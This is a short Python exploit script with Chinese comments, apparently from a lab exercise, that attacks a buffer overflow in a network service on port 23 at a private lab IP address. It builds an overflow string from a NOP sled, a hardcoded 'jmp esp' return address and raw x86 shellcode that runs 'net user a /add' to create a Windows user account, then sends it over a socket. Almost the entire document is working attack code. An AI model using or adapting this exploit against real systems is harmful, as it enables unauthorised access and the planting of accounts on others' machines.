#Socket编程
import socket
from string import ascii_uppercase,ascii_lowercase,digits
import itertools

#构造攻击函数
def send_buf(buffer,host='192.168.255.129',port=23):
  with socket.socket(socket.AF_INET,socket.SOCK_STREAM) as sock:
    #连接目标主机（connect）
    sock.connect((host,port))
    #发送溢出字符串，进行攻击
    data = b'ping ' + buffer + b'\r\n'
    sock.send(data)
    sock.recv(1000)

#生成不重复的2000个字符的字符串。确定跳转位置    
pattern = (''.join(map(''.join,itertools.product(ascii_uppercase,ascii_lowercase,digits))).encode())[:2000]

#创建一个用户的shellcode
shellcode = b'\x55\x8B\xEC\x33\xFF\x57\x83\xEC\x0C\xC6\x45\xF0\x6E\xC6\x45\xF1\x65\xC6\x45\xF2\x74\xC6\x45\xF3\x20\xC6\x45\xF4\x75\xC6\x45\xF5\x73\xC6\x45\xF6\x65\xC6\x45\xF7\x72\xC6\x45\xF8\x20\xC6\x45\xF9\x61\xC6\x45\xFA\x20\xC6\x45\xFB\x2F\xC6\x45\xFC\x61\xC6\x45\xFD\x64\xC6\x45\xFE\x64\x8D\x45\xF0\x50\xB8\xC7\x93\xBF\x77\xFF\xD0'

#jmp esp
retaddr = bytes.fromhex('7ffa4512')[::-1]

#将shellcode写入esp，构造溢出字符串
buf = ((b"\x90" *4 + shellcode).ljust(1012,b"\x90") + retaddr).ljust(2000,b"\x90")

#执行函数
send_buf(buf)
